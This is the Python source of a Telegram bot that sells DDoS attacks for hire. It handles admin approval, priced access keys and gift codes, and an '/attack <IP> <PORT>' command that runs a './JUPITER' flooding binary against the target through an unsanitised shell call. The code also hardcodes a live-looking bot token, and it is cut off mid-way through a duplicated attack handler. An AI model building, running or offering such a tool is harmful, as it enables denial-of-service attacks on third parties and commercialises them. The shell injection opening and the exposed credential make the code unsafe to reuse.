import telebot
import subprocess
import requests
import datetime
import os
import logging
import random
import string
from telebot import types
import threading

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI')

# Initialize the bot
API_TOKEN = '7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI'
bot = telebot.TeleBot(API_TOKEN)

# Owner and admin user IDs
owner_id = "6077036964"
admin_ids = ["6077036964"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")



@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        "🌟 ᙎᙓᒪᙅOᙏᙓ TO Tᕼᙓ ᗩᖇᙏᗩᑎ Tᙓᗩᙏ ᗪᗪOS ᙖOT 🌟\n\n"
        f"🕒 ȻᵾɌɌɆNŦ ŦƗMɆ : {get_current_time()} ⏲️\n\n"
        
        "👑 AƊMIƝS ƇOMMAƝƊS 👑\n"
        "👤 /approveuser - <ιd> <dᥙrᥲtιon> - Aρρrovᥱ ᥲ ᥙsᥱr for ᥲ ᥴᥱrtᥲιn dᥙrᥲtιon (dᥲყ, ᥕᥱᥱk, month) (ONLY ADMINS) ✅\n"
        "❌ /removeuser - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐮𝐬𝐞𝐫 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭'𝐬 𝐚𝐜𝐜𝐞𝐬𝐬 🚫 \n"
        "🔑 /addadmin - <𝐢𝐝> <𝐛𝐚𝐥𝐚𝐧𝐜𝐞> - 𝐀𝐝𝐝 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐭𝐨𝐫 𝐰𝐢𝐭𝐡 𝐚 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐛𝐚𝐥𝐚𝐧𝐜𝐞 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐜𝐡𝐨𝐢𝐜𝐞 💰\n"
        "🚫 /removeadmin - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭 ❌ \n\n"
        "💸 /setkeyprice - <𝐝𝐚𝐲/𝐰𝐞𝐞𝐤/𝐦𝐨𝐧𝐭𝐡> <𝐩𝐫𝐢𝐜𝐞> - 𝐒𝐞𝐭 𝐩𝐫𝐢𝐜𝐞𝐬 𝐟𝐨𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐤𝐞𝐲𝐬 𝐛𝐚𝐬𝐞𝐝 𝐨𝐧 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Owner only) 💵\n"
        "🎁 /creategift - <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> - 𝐂𝐫𝐞𝐚𝐭𝐞 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐟𝐨𝐫 𝐚 𝐬𝐩𝐞𝐜𝐢𝐟𝐢𝐞𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Admin only) 🎉\n\n"
        
        "👥 USERS COMMANDS 👥\n"
        "💰 /checkbalance - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒃𝒂𝒍𝒂𝒏𝒄𝒆 𝒂𝒏𝒅 𝒔𝒆𝒆 𝒉𝒐𝒘 𝒎𝒂𝒏𝒚 𝒓𝒆𝒔𝒐𝒖𝒓𝒄𝒆𝒔 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 📊\n"
        "💥 /attack - < 𝙄𝙋 > < 𝙋𝙊𝙍𝙏 > < 𝙏𝙄𝙈𝙀 > 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 (use responsibly! ⚠️)\n"
        "🛑 /stop - 𝐓𝐎 𝐒𝐓𝐎𝐏 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 ⏹️\n"
        "🎁 /redeem - <𝐜𝐨𝐝𝐞> - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐲𝐨𝐮'𝐯𝐞 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝 🎊\n\n"
        
        "🤖 𝗢𝘂𝗿 𝗯𝗼𝘁 𝗶𝘀 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗮𝘀𝘀𝗶𝘀𝘁 𝘆𝗼𝘂, 𝗯𝘂𝘁 𝗽𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆 𝗮𝗻𝗱 𝗲𝘁𝗵𝗶𝗰𝗮𝗹𝗹𝘆. 🛡️\n"
        "🚀 𝗦𝘁𝗮𝗿𝘁 𝘂𝘀𝗶𝗻𝗴 🙋‍♂️✨"
    )
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"

    user_info = (
        f"✨ ᕼᕮY {user.first_name}! HƐRƐ'S ƳOUR ƊƐƬAILS ⚓\n"
        f"👤 тԍ usᴇʀ ιᴅ : {user.id}\n"
        f"👍 тԍ usᴇʀɴᴀмᴇ : @{user.username if user.username else 'ɴoт sᴇт'}\n"
        f"🌍 ғιʀsт ɴᴀмᴇ : {user.first_name}\n"
        f"🆔 ʟᴀsт ɴᴀмᴇ : {user.last_name if user.last_name else 'ɴoт sᴇт'}\n"
        f"📅 נoιɴᴇᴅ ᴅᴀтᴇ : {message.date}\n"
        f"💌 cнᴀт ιᴅ : {message.chat.id}\n"
        f"✔️ ᴀᴘᴘʀovᴀʟ sтᴀтus : {is_approved}\n\n"
        f"κᴇᴇᴘ sнιɴιɴԍ ᴀɴᴅ нᴀvᴇ ᴀ woɴᴅᴇʀғuʟ ᴅᴀʏ! 🌈✨\n"
        f"ŦĦƗS ɃØŦ ØWNɆɌ :- @MR_ARMAN_OWNER"
    )
    
    bot.send_message(message.chat.id, user_info, parse_mode='Markdown')

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]

            if duration not in key_prices:
                response = "🚨 Invalid duration! Use *'day'*, *'week'*, or *'month'*. 🚨"
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(
                days=1 if duration == "day" else 7 if duration == "week" else 30
            )
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")

            # Notify the user being approved
            approval_message = (
                f"🎉✨ ᑕ O ᑎ G ᖇ ᗩ T ᑌ ᒪ ᗩ T I O ᑎ ᔕ , {user_to_approve} ✨🎉\n\n"
                f"𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹𝗹𝘆 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗳𝗼𝗿 [ {duration} ] 𝗮𝗰𝗰𝗲𝘀𝘀 🚀\n"
                "🎈𝗚𝗲𝘁 𝗿𝗲𝗮𝗱𝘆 𝘁𝗼 𝗲𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗮𝗺𝗮𝘇𝗶𝗻𝗴 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 🎊\n\n"
                "𝗶𝗳 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀, 𝗳𝗲𝗲𝗹 𝗳𝗿𝗲𝗲 𝘁𝗼 𝗿𝗲𝗮𝗰𝗵 𝗼𝘂𝘁! 🤗💬"
                "𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 :- @MR_ARMAN_OWNER💬"
            )
            bot.send_message(user_to_approve, approval_message)

            response = f"🎉✨  ᑕ O ᑎ G ᖇ ᗩ T ᑌ ᒪ ᗩ T I O ᑎ ᔕ {user_to_approve} ✨🎉\n\n𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹𝗹𝘆 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗳𝗼𝗿 [ {duration} ] 𝗮𝗰𝗰𝗲𝘀𝘀 🚀\n🎈𝗚𝗲𝘁 𝗿𝗲𝗮𝗱𝘆 𝘁𝗼 𝗲𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗮𝗺𝗮𝘇𝗶𝗻𝗴 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 🎊\n\n𝗶𝗳 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀, 𝗳𝗲𝗲𝗹 𝗳𝗿𝗲𝗲 𝘁𝗼 𝗿𝗲𝗮𝗰𝗵 𝗼𝘂𝘁 🤗✨\n\n𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 :- @MR_ARMAN_OWNER"
        else:
            response = "❗𝐔𝐒𝐀𝐆𝐄 : /approveuser <𝗶𝗱> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>❗"
    else:
        response = "🚫 𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡"
    
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"🎉✨ ᑕ O ᑎ G ᖇ ᗩ T ᑌ ᒪ ᗩ T I O ᑎ ᔕ , {admin_to_add} ✨🎉\n\n𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹𝗹𝘆 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗳𝗼𝗿 [ {balance} ] 𝗮𝗰𝗰𝗲𝘀𝘀 🚀\n\n🎈𝗚𝗲𝘁 𝗿𝗲𝗮𝗱𝘆 𝘁𝗼 𝗲𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗮𝗺𝗮𝘇𝗶𝗻𝗴 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀 🎊\n𝗶𝗳 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗾𝘂𝗲𝘀𝘁𝗶𝗼𝗻𝘀, 𝗳𝗲𝗲𝗹 𝗳𝗿𝗲𝗲 𝘁𝗼 𝗿𝗲𝗮𝗰𝗵 𝗼𝘂𝘁! 🤗💬\n\n𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 @MR_ARMAN_OWNER 💬"
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"𝗚𝗜𝗙𝗧 𝗖𝗢𝗗𝗘 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 💥\n𝗛𝗘𝗥𝗘'𝗦 𝗧𝗛𝗘 𝗖𝗢𝗗𝗘 :- {code}\n𝗙𝗢𝗥 {duration} 🎁"
                else:
                    response = "𝒀𝒐𝒖 𝒅𝒐 𝒏𝒐𝒕 𝒉𝒂𝒗𝒆 𝒆𝒏𝒐𝒖𝒈𝒉 𝒄𝒓𝒆𝒅𝒊𝒕𝒔 𝒕𝒐 𝒄𝒓𝒆𝒂𝒕𝒆 𝒂 𝒈𝒊𝒇𝒕 𝒄𝒐𝒅𝒆\n𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 @MR_ARMAN_OWNER 💬"
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"𝙂𝙞𝙛𝙩 𝙘𝙤𝙙𝙚 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 ✅\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧  {duration} 🎁"
        else:
            response = "𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙤𝙧 𝙚𝙭𝙥𝙞𝙧𝙚𝙙 𝙜𝙞𝙛𝙩 𝙘𝙤𝙙𝙚 ❌\n\n𝗣𝗟𝗘𝗔𝗦𝗘 𝗕𝗨𝗬 𝗙𝗥𝗢𝗠 :- @MR_ARMAN_OWNER 💬"
    else:
        response = "𝙐𝙎𝘼𝙂𝙀: /redeem < 𝘾𝙊𝘿𝙀 >"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"🆈🅾🆄🆁 🅲🆄🆁🆁🅴🅽🆃 🅱🅰🅻🅰🅽🅲🅴 🅸🆂\n{free_user_credits[user_id]} 🅲🆁🅴🅳🅸🆃🆂"
    else:
        response = "𝙎𝙊𝙍𝙍𝙔 𝙔𝙊𝙐 𝘿𝙊𝙉'𝙏 𝙃𝘼𝙑𝙀 𝘼𝙉𝙔 𝘽𝘼𝙇𝘼𝙉𝘾𝙀\n𝙋𝙇𝙀𝘼𝙎𝙀 𝘽𝙐𝙔 𝘾𝙍𝙀𝘿𝙄𝙏𝙎\n\n𝐓𝐇𝐈𝐒 𝐁𝐎𝐓 𝐎𝐖𝐍𝐄𝐑 :- @MR_ARMAN_OWNER."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"𝙆𝙀𝙔 𝙋𝙍𝙄𝘾𝙀 𝙁𝙊𝙍 {duration}\n𝙎𝙀𝙏𝙏 𝙏𝙊 {price} 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['contact'])
def contact_info(message):
    bot.reply_to(message, "📞 𝗛𝗘𝗥𝗘'𝗦 𝗧𝗛𝗘 𝗢𝗪𝗡𝗘𝗥 𝗜𝗗 :- @MR_ARMAN_OWNER ✅\n𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗡𝗢𝗪")


# Dictionary to store the running status of user's attacks
running_attacks = {}
max_attacks_allowed = 30  # Maximum number of attacks allowed per user
user_limits = {}  # Dictionary to store user-specific limits

user_attack_limits = 30  # Default limit for users that don't have specific limits set

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"⚔️ 𝗕𝗔𝗧𝗧𝗟𝗘 𝗛𝗔𝗦 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ⚔️\n\n𝗧𝗔𝗥𝗚𝗘𝗧 :- [ {target} ]\n𝗣𝗢𝗥𝗧 [ {port} ]\n🕦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘 [ {time} ]\n💣 𝗠𝗘𝗧𝗛𝗢𝗗 :- 𝗕𝗟𝗔𝗖𝗞 𝗠𝗔𝗚𝗜𝗖 𝟰𝟰𝟯 🖤\n\n🔥 𝗦𝗧𝗔𝗧𝗨𝗦 :- 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗙𝗨𝗟𝗟 𝗣𝗢𝗪𝗘𝗥 ⚔️🔥\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 :- @MR_ARMAN_OWNER"
    bot.reply_to(message, response)


@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    print(f"Received command from user ID: {user_id}")  # Debug line
    
    # Check if the user is allowed to attack
    if user_id not in allowed_user_ids:
        response = ("🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀 🚫\n\n"
                    "𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝘁𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗽𝗲𝗿𝘀𝗼𝗻𝗻𝗲𝗹 𝗼𝗻𝗹𝘆"
                    "𝗧𝗼 𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 📩")
    else:
        command = message.text.split()
        
        # Check if the command format is correct
        if len(command) == 3 or (not message.text.startswith('/') and len(command) == 2):
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            try:
                port = int(command[2])  # Attempt to convert port to int
            except ValueError:
                response = "❗𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫! 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐚𝐬 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫"
                bot.reply_to(message, response)
                return
            
            time = 150  # Default attack time to 120 seconds

            # Ensure running attack check here
            effective_limit = user_limits.get(user_id, max_attacks_allowed)
        
            # Check if the user has reached the maximum number of attacks
            if user_id in running_attacks and len(running_attacks[user_id]) >= effective_limit:
                response = "🚫 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝗮𝗰𝗵𝗲𝗱! 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝗺𝗼𝗿𝗲 𝘁𝗵𝗮𝗻 𝟭𝟬 𝘁𝗶𝗺𝗲𝘀\n\nDM TO BUY :- @MR_ARMAN_OWNER"
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                
                if user_id not in running_attacks:
                    running_attacks[user_id] = []

                running_attacks[user_id].append((target, port, time))
                
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time}"
                subprocess.run(full_command, shell=True)

                # Count the user's attacks
                attack_count = len(running_attacks[user_id])
                response = f"𝘽𝘼𝙏𝙏𝙇𝙀 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n\n𝗧𝗔𝗥𝗚𝗘𝗧 :- [ {target} ]\n𝗣𝗢𝗥𝗧 [ {port} ]\n🕦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘 [ {time} ]\n\n𝗬𝗢𝗨 𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 :- {attack_count}/{max_attacks_allowed}\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 :- @MR_ARMAN_OWNER"
        else:
            response = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n\n𝗨𝗦𝗔𝗚𝗘 :- /𝗮𝘁𝘁𝗮𝗰𝗸 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- 👊🤦🙅🔍 𝗠𝗢𝗥𝗘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡:\𝗻- <𝗜𝗣>: 𝗧𝗮𝗿𝗴𝗲𝘁'𝘀 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀\𝗻- <𝗣𝗢𝗥𝗧>: 𝗦𝗽𝗲𝗰𝗶𝗳𝗶𝗰 𝗽𝗼𝗿𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸\𝗻- <𝗧𝗜𝗠𝗘>: 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗼𝗳 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\𝗻\𝗻🚨 𝗨𝗦𝗘 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗜𝗕𝗟𝗬 🚨\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 :- @MR_ARMAN_OWNER"
        
    # Send response to user
    bot.reply_to(message, response)


@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in running_attacks and running_attacks[user_id]:
        target, port, time = running_attacks[user_id].pop()  # Remove the last attack
        # Here, you would add the logic to actually stop the attack subprocess, if applicable
        response = f"🚧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🚧\n\n𝗧𝗔𝗥𝗚𝗘𝗧 :- [ {target} ]\n𝗣𝗢𝗥𝗧 [ {port} ]\n🕦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘 [ {time} ]\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 :- @MR_ARMAN_OWNER"
    else:
        response = "𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗿𝘂𝗻𝗻𝗶𝗻𝗴. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗿𝘀𝘁."
    
    bot.reply_to(message, response)

# Dictionary to track ongoing attacks
running_attacks = {}


@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    print(f"Received command from user ID: {user_id}")  # Debug line
    
    # Check if the user is allowed to attack
    if user_id not in allowed_user_ids:
        response = ("🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀  🚫\n\n"
